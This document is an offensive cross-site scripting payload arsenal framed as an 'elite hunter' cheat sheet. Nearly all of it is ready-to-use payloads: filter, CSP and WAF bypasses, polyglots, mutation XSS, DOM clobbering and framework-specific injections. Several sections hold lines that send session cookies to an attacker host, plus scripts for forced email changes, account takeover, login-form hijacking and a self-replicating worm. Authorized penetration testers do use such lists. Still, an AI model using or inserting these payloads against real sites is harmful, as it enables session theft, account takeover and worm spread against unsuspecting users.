# DEVIL'S DEN — XSS PAYLOAD ARSENAL v1.0
# ELITE HUNTER PROTOCOL — Every XSS Variant. Every Bypass. Every Context.

## SECTION 1: DETECTION PROBES (Test These First)
### Basic Detection Canaries
```
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
```

## SECTION 2: REFLECTED XSS — 60+ PAYLOADS

### Basic Tag Injection
```
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
<ScRiPt>alert(1)</sCrIpT>
<script >alert(1)</script >
<script	>alert(1)</script>
<script/x>alert(1)</script>
<script>/**/alert(1)/**/</script>
<script>ale\u0072t(1)</script>
<script>\u0061lert(1)</script>
<script>eval('alert(1)')</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### Attribute Context Injection
```
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(1)
" onerror="alert(1)
'onmouseover='alert(1)
'onfocus='alert(1)'autofocus='
" onload="alert(1)
" onwheel="alert(1)
" onmouseenter="alert(1)
" onkeydown="alert(1)
" ondblclick="alert(1)
" oncontextmenu="alert(1)
" onanimationend="alert(1)
" ontransitionend="alert(1)
```

### HTML5 Event Handlers (Rare/Unusual)
```
<body onpageshow=alert(1)>
<body onhashchange=alert(1)><a href="#x">click</a>
<body onpopstate=alert(1)><a href="javascript:history.pushState(1,1,'#')">push</a>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)></select>
<textarea autofocus onfocus=alert(1)></textarea>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="alert(1)">
<audio><source onerror="alert(1)">
<img src=1 onerror=alert(1)>
<img src=1 onerror="alert(document.cookie)">
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<iframe onload=alert(1)></iframe>
<iframe src="javascript:alert(1)"></iframe>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<link rel=stylesheet href="data:text/css,body{background:url('javascript:alert(1)')}">
<table background="javascript:alert(1)">
<div style="background:url(javascript:alert(1))">
<div style="width:expression(alert(1))">
```

### SVG Context XSS
```
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><script>alert&lpar;1&rpar;</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=y>
<svg><animateMotion onbegin=alert(1)>
<svg><animateColor onbegin=alert(1) attributeName=fill values="red;blue" dur="5s">
<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><text x=20 y=20>XSS</text></a></svg>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>
```

### MathML Context XSS
```
<math><mtext><table><mglyph><style><img src=1 onerror=alert(1)>
<math href="javascript:alert(1)">CLICKME</math>
<math><annotation-xml encoding="text/html"><img onerror="alert(1)" src=1></annotation-xml></math>
```

### JavaScript URI
```
javascript:alert(1)
javascript:alert(document.cookie)
javascript:void(document.location='https://attacker.interactsh.io/?c='+document.cookie)
JaVaScRiPt:alert(1)
j&#97;v&#97;script:alert(1)
javascript&#x3A;alert(1)
&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)
```

## SECTION 3: DOM XSS — SOURCES AND SINKS

### Dangerous Sources
```
document.URL
document.documentURI
document.location
document.location.href
document.location.search
document.location.hash
document.referrer
window.name
localStorage.getItem('user')
sessionStorage.getItem('data')
history.state
window.opener
document.cookie
```

### Dangerous Sinks
```
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
Function()
location.href =
location.assign()
location.replace()
element.src =
element.href =
element.action =
element.data =
jQuery.html()
jQuery.append()
jQuery.prepend()
$(selector).html()
```

### DOM XSS Test Payloads (for URL hash/fragment)
```
#<img src=1 onerror=alert(1)>
#javascript:alert(1)
#"><img src=1 onerror=alert(1)>
#<svg onload=alert(1)>
#<script>alert(1)</script>
?q=<img src=1 onerror=alert(1)>
?redirect=javascript:alert(1)
?name=<svg onload=alert(document.domain)>
?callback=alert(1)//
?jsonp=alert
```

## SECTION 4: BLIND XSS — PHONE HOME PAYLOADS
```
"><script src=//attacker.interactsh.io/x.js></script>
"><script src=//BURP-COLLABORATOR-SUBDOMAIN></script>
<img src=x onerror="this.src='//attacker.interactsh.io/?c='+document.cookie">
<script>new Image().src='//attacker.interactsh.io/?c='+document.cookie</script>
<script>fetch('//attacker.interactsh.io/?c='+document.cookie)</script>
<script>document.location='//attacker.interactsh.io/?c='+document.cookie</script>
<script>navigator.sendBeacon('//attacker.interactsh.io',document.cookie)</script>
"><script>var i=new Image;i.src="//attacker.interactsh.io/"%2Bdocument.cookie;</script>
<input onfocus="fetch('//attacker.interactsh.io/?c='+btoa(document.cookie))" autofocus>
```

## SECTION 5: XSS FILTER BYPASS TECHNIQUES

### Encoding Bypasses
```
&lt;script&gt;alert(1)&lt;/script&gt;   (HTML entity)
%3Cscript%3Ealert(1)%3C%2Fscript%3E  (URL encoded)
%253Cscript%253Ealert(1)%253C%252Fscript%253E  (Double URL encoded)
\u003cscript\u003ealert(1)\u003c/script\u003e  (Unicode)
&#60;script&#62;alert(1)&#60;/script&#62;  (Decimal HTML entity)
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;  (Hex HTML entity)
<![CDATA[<script>alert(1)</script>]]>  (CDATA)
```

### Tag/Attribute Obfuscation
```
<ScRiPt>alert(1)</sCrIpT>
< script>alert(1)</ script>
<script >alert(1)</script>
<script	>alert(1)</script>   (Tab instead of space)
<script
>alert(1)</script>    (Newline)
<!--><script>alert(1)</script>  (Comment before)
<script>/*%0a*/alert(1)</script>
<script>alert/**//**//**/(1)</script>
```

### Event Handler Bypass
```
<img src=x OnErRoR=alert(1)>
<img src=x oNerRoR   =alert(1)>
<img/src=x/onerror=alert(1)>
<img src=x onerror&#61;alert(1)>
<img src=x onerror=alert&lpar;1&rpar;>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
```

### Uncommon Tags
```
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<dialog onclose=alert(1)>
<xss id=x tabindex=1 onfocus=alert(1) style=display:block>
<template>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### String Splitting
```
<s<script>cript>alert(1)</s</script>cript>
<scr<script>ipt>alert(1)</sc</script>ript>
```

## SECTION 6: CSP BYPASS TECHNIQUES

### When script-src 'nonce-XXXX' is set:
```
# Test base-uri bypass:
<base href="https://attacker.com/">
# If base-uri not restricted, load scripts from attacker domain

# Test if JSONP endpoint exists on trusted domain:
<script src="https://trusted-cdn.com/jsonp?callback=alert(1)"></script>

# Test Angular template injection (if Angular loaded):
{{constructor.constructor('alert(1)')()}}
{{7*7}} → 49 confirms Angular, then:
{{$eval.constructor('alert(1)')()}}

# Test if trusted CDN hosts old Angular:
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

### When default-src 'self' is set:
```
# Look for XSS on same origin to escalate
# Look for file upload → serve from same origin
# Look for JSONP on same origin: /api/user?callback=alert(1)
# Look for open redirect that reflects JS: /redirect?url=javascript:alert(1)
```

## SECTION 7: WAF BYPASS PAYLOADS

### Generic WAF Bypasses
```
<svg/onload=alert(1)>
<svg/ONLOAD=alert(1)>
<svg	onload=alert(1)>   (Tab)
<svg%09onload=alert(1)>
<svg%0aonload=alert(1)>
<svg%0conload=alert(1)>
<svg%0donload=alert(1)>
<svg%20onload=alert(1)>
<svg%2fonload=alert(1)>
<svg+onload=alert(1)>
```

### Cloudflare Specific Bypasses (research-based)
```
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%2300000000040document.domain)>
<img src=x onerror=alert`1`>
<script>onerror=alert;throw 1337</script>
```

## SECTION 8: XSS POLYGLOTS
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
"><<img src='//attacker.interactsh.io?c='&#43;escape(document.cookie)><"
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

## SECTION 9: STORED XSS — MUTATION XSS (mXSS)
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<listing><img src="</listing><img src=x onerror=alert(1)>">
<xmp><p title="</xmp><img src=x onerror=alert(1)>">
<style><img src="</style><img src=x onerror=alert(1)>">
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
<math><style><img src=x onerror=alert(1)></style></math>
```

## SECTION 10: DOM CLOBBERING
```
# Clobber id-based references:
<img name=src id=x>
<img id=config>
<a id=config name=token href="javascript:alert(1)">

# Clobber window properties:
<form id=x></form><form id=x name=y>
<img id=x name=domain>

# Clobber to bypass security checks:
<img id=isLoggedIn>   (makes isLoggedIn truthy)
```

## SECTION 11: XSS VIA HTTP HEADERS (Stored in Logs/Responses)
```
User-Agent: <script>alert(1)</script>
Referer: <script>alert(1)</script>
X-Forwarded-For: <script>alert(1)</script>
Accept-Language: <svg onload=alert(1)>
X-Custom-Header: "><script>alert(1)</script>
Origin: javascript:alert(1)
```

## SECTION 12: XSS IN SPECIFIC CONTEXTS

### In JSON Response (content-type sniffing)
```
{"name":"<script>alert(1)</script>"}
{"callback":"alert(1)"}   (JSONP endpoint)
```

### In SVG File Upload
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

### In HTML File Upload (if allowed)
```html
<!DOCTYPE html><script>alert(document.cookie)</script>
```

### In Markdown (if rendered)
```
[XSS](javascript:alert(1))
![XSS](x onerror=alert(1))
<script>alert(1)</script>
```

### In PDF (JavaScript in PDF)
```
app.alert("XSS")   (if PDF viewer executes JavaScript)
```

## SECTION 13: REACT/VUE/ANGULAR SPECIFIC

### React — dangerouslySetInnerHTML
```
# If app uses dangerouslySetInnerHTML={{__html: userInput}}:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Vue.js — v-html directive
```
# If app uses v-html with user input:
<img src=x onerror=alert(1)>
```

### Angular — [innerHTML] binding
```
# Angular sanitizes by default, but bypasses exist:
<img src=1 alt="1" onerror="alert(1)">
# Via DomSanitizer.bypassSecurityTrustHtml
```

### AngularJS (1.x) Template Injection (same-origin script)
```
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

## SECTION 14: XSS CHAINING

### XSS → Session Cookie Theft (when HttpOnly not set)
```javascript
fetch('https://attacker.interactsh.io/?c='+document.cookie, {mode:'no-cors'})
new Image().src='https://attacker.interactsh.io/?c='+btoa(document.cookie)
```

### XSS → CSRF (force state-changing action)
```javascript
fetch('https://target.com/api/change-email', {
  method:'POST',
  headers:{'Content-Type':'application/json','X-CSRF-Token':document.querySelector('[name=csrf]').value},
  body:JSON.stringify({email:'attacker@evil.com'}),
  credentials:'include'
})
```

### XSS → DOM-based credential harvesting
```javascript
// Replace login form with fake one
document.querySelector('form').setAttribute('action','https://attacker.interactsh.io')
```

### XSS → XSS Worm (self-replicating stored XSS)
```javascript
// Infect user profiles by posting to API
fetch('/api/profile',{method:'PUT',body:JSON.stringify({bio:'<script src=//attacker.com/worm.js></script>'}),headers:{'Content-Type':'application/json'},credentials:'include'})
```

### XSS → Full Account Takeover
```javascript
// 1. Steal CSRF token
var csrf = document.querySelector('[name=csrf_token]').value
// 2. Change email
fetch('/api/user/email',{method:'POST',body:'email=attacker@evil.com&csrf='+csrf,credentials:'include'})
// 3. Trigger password reset to new email
```

## SECTION 15: SELF-LEARNING — CUSTOM PAYLOAD GENERATION PROTOCOL

When analyzing a target's source code, follow this protocol to generate unique payloads:

### Step 1: Identify the sanitization regex
```bash
# Look for sanitizer patterns in JS:
grep -E "(sanitize|escape|encode|strip|replace|filter)" app.js
# Example found: input.replace(/[<>]/g, '')
# Bypass: Use attributes instead: " onerror="alert(1)
```

### Step 2: Identify the output context
```bash
# Find where input is reflected: innerHTML, textContent, attribute value, JavaScript variable
# innerHTML: HTML tags work
# textContent: need DOM XSS approach
# Attribute value: event handler injection
# JavaScript variable: break out of string context
```

### Step 3: Generate context-specific payload
```
# Context: value="USER_INPUT"
# Payload: " onmouseover="alert(1)
# Context: var x = "USER_INPUT";
# Payload: ";alert(1)//
# Context: <a href="USER_INPUT">
# Payload: javascript:alert(1)
# Context: element.innerHTML = USER_INPUT;
# Payload: <img src=x onerror=alert(1)>
```

### Step 4: Create bypass for specific filter
```
# Found filter: strip <script> tags
# Bypass: <img src=x onerror=alert(1)>
# Found filter: strip on* attributes
# Bypass: <svg/onload=alert(1)> or javascript: URI
# Found filter: HTML encode <> only
# Bypass: " onerror="alert(1) (attribute injection)
```
